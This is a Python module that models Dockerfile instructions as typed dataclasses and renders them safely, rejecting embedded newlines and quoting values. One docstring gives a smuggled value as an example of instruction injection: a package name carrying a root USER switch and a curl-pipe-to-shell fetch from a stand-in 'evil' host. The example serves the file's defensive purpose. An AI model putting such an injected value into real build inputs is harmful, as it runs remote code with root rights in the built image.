"""Typed Dockerfile instruction model and renderer.

Prior art renders Dockerfiles by calling ``str.format()`` on template strings.
That forces every literal brace in the file to be doubled, so a template can
never contain ``${VAR}``, ``${VAR:-default}``, or ``awk '{print $1}'`` without
silently corrupting itself. The constraint is invisible until it bites.

Modelling instructions as objects removes the escaping problem entirely, and —
more importantly — makes a Dockerfile a *list* rather than a monolithic string,
which is the precondition for composing optional layers out of modules.

These are plain frozen dataclasses rather than pydantic models: they are an
internal rendering detail, never deserialized from user input. The user-facing,
validated contract lives in :mod:`jormungandr.runtime.spec`.
"""

from __future__ import annotations

from collections.abc import Iterable, Mapping, Sequence
from dataclasses import dataclass
from typing import Protocol, runtime_checkable

__all__ = [
    "Arg",
    "BindMount",
    "CacheMount",
    "Cmd",
    "Comment",
    "Copy",
    "Entrypoint",
    "Env",
    "From",
    "Instruction",
    "Label",
    "Mount",
    "Raw",
    "Run",
    "SecretMount",
    "User",
    "Workdir",
    "render_dockerfile",
]

_CONTINUATION = " \\\n    && "


class DockerfileError(ValueError):
    """Raised when instructions cannot be rendered into a valid Dockerfile."""


@runtime_checkable
class Instruction(Protocol):
    """Anything that can render itself as one or more Dockerfile lines."""

    def render(self) -> str: ...


def _check_single_line(value: str, *, what: str) -> str:
    """Reject embedded newlines.

    Every instruction here is line-oriented, so a newline in a value does not
    escape a string — it ends the instruction and starts a new one. A package
    name of ``git\\nUSER root\\nRUN curl evil|sh`` would otherwise render three
    real instructions. That needs no attacker to bite: any value that happens
    to carry a trailing newline silently produces a structurally different
    Dockerfile.
    """
    if "\n" in value or "\r" in value:
        raise DockerfileError(
            f"{what} may not contain a newline: {value!r}. "
            "Values are interpolated into line-oriented instructions."
        )
    return value


def _quote(value: str) -> str:
    """Quote a value for ENV/LABEL/ARG.

    Deliberately does not escape ``$``: ``ENV PATH="/opt/venv/bin:$PATH"`` must
    keep its expansion. Docker expands ``$`` inside double quotes.
    """
    if value and not any(ch in value for ch in ' \t\n"\\'):
        return value
    escaped = value.replace("\\", "\\\\").replace('"', '\\"').replace("\n", "\\n")
    return f'"{escaped}"'


def _check_path(path: str, *, instruction: str) -> str:
    if not path:
        raise DockerfileError(f"{instruction}: empty path")
    if any(ch.isspace() for ch in path):
        raise DockerfileError(
            f"{instruction}: path {path!r} contains whitespace; "
            "rename it rather than relying on quoting"
        )
    return path


def _render_pairs(keyword: str, pairs: Mapping[str, str]) -> str:
    if not pairs:
        raise DockerfileError(f"{keyword}: no key/value pairs given")
    rendered = [
        f"{_check_single_line(key, what=f'{keyword} key')}="
        f"{_quote(_check_single_line(value, what=f'{keyword} value'))}"
        for key, value in pairs.items()
    ]
    if len(rendered) == 1:
        return f"{keyword} {rendered[0]}"
    body = " \\\n    ".join(rendered)
    return f"{keyword} {body}"


# --------------------------------------------------------------------------
# BuildKit mounts
# --------------------------------------------------------------------------


class Mount(Protocol):
    def render(self) -> str: ...


@dataclass(frozen=True, slots=True)
class CacheMount:
    """``RUN --mount=type=cache`` — persists a package-manager cache between builds.

    This is the single biggest build-speed win available, and it is unreachable
    through the legacy builder.
    """

    target: str
    sharing: str = "locked"
    id: str | None = None

    def render(self) -> str:
        parts = ["type=cache"]
        if self.id:
            parts.append(f"id={self.id}")
        parts.append(f"target={self.target}")
        parts.append(f"sharing={self.sharing}")
        return "--mount=" + ",".join(parts)


@dataclass(frozen=True, slots=True)
class BindMount:
    target: str
    source: str | None = None
    from_: str | None = None

    def render(self) -> str:
        parts = ["type=bind", f"target={self.target}"]
        if self.source:
            parts.append(f"source={self.source}")
        if self.from_:
            parts.append(f"from={self.from_}")
        return "--mount=" + ",".join(parts)


@dataclass(frozen=True, slots=True)
class SecretMount:
    """``RUN --mount=type=secret`` — the correct way to use a token at build time.

    Keeps credentials out of image layers, out of ``docker history``, and out of
    the host process table.
    """

    id: str
    target: str | None = None
    required: bool = True

    def render(self) -> str:
        parts = ["type=secret", f"id={self.id}"]
        if self.target:
            parts.append(f"target={self.target}")
        if self.required:
            parts.append("required=true")
        return "--mount=" + ",".join(parts)


# --------------------------------------------------------------------------
# Instructions
# --------------------------------------------------------------------------


@dataclass(frozen=True, slots=True)
class From:
    image: str
    platform: str | None = None
    alias: str | None = None

    def render(self) -> str:
        if not self.image:
            raise DockerfileError("FROM: empty image reference")
        _check_single_line(self.image, what="FROM image")
        head = "FROM"
        if self.platform:
            head += f" --platform={self.platform}"
        out = f"{head} {self.image}"
        if self.alias:
            out += f" AS {self.alias}"
        return out


@dataclass(frozen=True, slots=True)
class Arg:
    name: str
    default: str | None = None

    def render(self) -> str:
        name = _check_single_line(self.name, what="ARG name")
        if self.default is None:
            return f"ARG {name}"
        return (
            f"ARG {name}={_quote(_check_single_line(self.default, what='ARG default'))}"
        )


@dataclass(frozen=True, slots=True)
class Env:
    pairs: Mapping[str, str]

    def render(self) -> str:
        return _render_pairs("ENV", self.pairs)


@dataclass(frozen=True, slots=True)
class Label:
    pairs: Mapping[str, str]

    def render(self) -> str:
        return _render_pairs("LABEL", self.pairs)


@dataclass(frozen=True, slots=True)
class Run:
    """A ``RUN`` instruction built from a list of shell commands.

    Commands are joined with ``&&`` so the layer fails on the first error —
    ``set -e`` semantics without depending on the shell's configuration.
    """

    commands: tuple[str, ...]
    mounts: tuple[Mount, ...] = ()

    def __init__(
        self,
        commands: str | Sequence[str],
        *,
        mounts: Sequence[Mount] = (),
    ) -> None:
        normalized = (commands,) if isinstance(commands, str) else tuple(commands)
        if not normalized:
            raise DockerfileError("RUN: no commands given")
        if any(not c.strip() for c in normalized):
            raise DockerfileError("RUN: blank command")
        for command in normalized:
            _check_single_line(command, what="RUN command")
        object.__setattr__(self, "commands", normalized)
        object.__setattr__(self, "mounts", tuple(mounts))

    def render(self) -> str:
        head = "RUN"
        if self.mounts:
            head += " " + " ".join(m.render() for m in self.mounts)
        if len(self.commands) == 1 and not self.mounts:
            return f"RUN {self.commands[0]}"
        body = _CONTINUATION.join(self.commands)
        return f"{head} {body}"


@dataclass(frozen=True, slots=True)
class Copy:
    sources: tuple[str, ...]
    destination: str
    chown: str | None = None
    from_: str | None = None

    def __init__(
        self,
        sources: str | Sequence[str],
        destination: str,
        *,
        chown: str | None = None,
        from_: str | None = None,
    ) -> None:
        normalized = (sources,) if isinstance(sources, str) else tuple(sources)
        if not normalized:
            raise DockerfileError("COPY: no sources given")
        for src in normalized:
            _check_path(src, instruction="COPY")
        _check_path(destination, instruction="COPY")
        object.__setattr__(self, "sources", normalized)
        object.__setattr__(self, "destination", destination)
        object.__setattr__(self, "chown", chown)
        object.__setattr__(self, "from_", from_)

    def render(self) -> str:
        head = "COPY"
        if self.from_:
            head += f" --from={self.from_}"
        if self.chown:
            head += f" --chown={self.chown}"
        return f"{head} {' '.join(self.sources)} {self.destination}"


@dataclass(frozen=True, slots=True)
class Workdir:
    path: str

    def render(self) -> str:
        return f"WORKDIR {_check_path(self.path, instruction='WORKDIR')}"


@dataclass(frozen=True, slots=True)
class User:
    name: str

    def render(self) -> str:
        if not self.name.strip():
            raise DockerfileError("USER: empty name")
        return f"USER {_check_single_line(self.name, what='USER name')}"


@dataclass(frozen=True, slots=True)
class Cmd:
    argv: tuple[str, ...]

    def __init__(self, argv: Sequence[str]) -> None:
        normalized = tuple(argv)
        if not normalized:
            raise DockerfileError("CMD: empty argv")
        object.__setattr__(self, "argv", normalized)

    def render(self) -> str:
        rendered = ", ".join(
            '"{}"'.format(_check_single_line(a, what="argv entry").replace('"', '\\"'))
            for a in self.argv
        )
        return f"CMD [{rendered}]"


@dataclass(frozen=True, slots=True)
class Entrypoint:
    argv: tuple[str, ...]

    def __init__(self, argv: Sequence[str]) -> None:
        normalized = tuple(argv)
        if not normalized:
            raise DockerfileError("ENTRYPOINT: empty argv")
        object.__setattr__(self, "argv", normalized)

    def render(self) -> str:
        rendered = ", ".join(
            '"{}"'.format(_check_single_line(a, what="argv entry").replace('"', '\\"'))
            for a in self.argv
        )
        return f"ENTRYPOINT [{rendered}]"


@dataclass(frozen=True, slots=True)
class Comment:
    text: str

    def render(self) -> str:
        return "\n".join(
            f"# {line}" if line else "#" for line in self.text.splitlines()
        )


@dataclass(frozen=True, slots=True)
class Raw:
    """An escape hatch for instructions this model does not cover.

    Rendered verbatim. Reach for a real instruction type first.
    """

    text: str

    def render(self) -> str:
        return self.text


# --------------------------------------------------------------------------
# Rendering
# --------------------------------------------------------------------------


def render_dockerfile(
    instructions: Iterable[Instruction],
    *,
    syntax: str | None = "docker/dockerfile:1",
) -> str:
    """Render instructions to Dockerfile text.

    The ``# syntax`` directive must be the first line for BuildKit to enable
    mount and heredoc support, so it is emitted by default.

    Rendering is deterministic: the same instructions always produce byte-identical
    output. Image identity depends on this.
    """
    body = list(instructions)
    if not body:
        raise DockerfileError("no instructions to render")
    if not any(isinstance(i, From) for i in body):
        raise DockerfileError("Dockerfile has no FROM instruction")

    lines: list[str] = []
    if syntax:
        lines.append(f"# syntax={syntax}")
        lines.append("")
    for instruction in body:
        lines.append(instruction.render())
    return "\n".join(lines) + "\n"
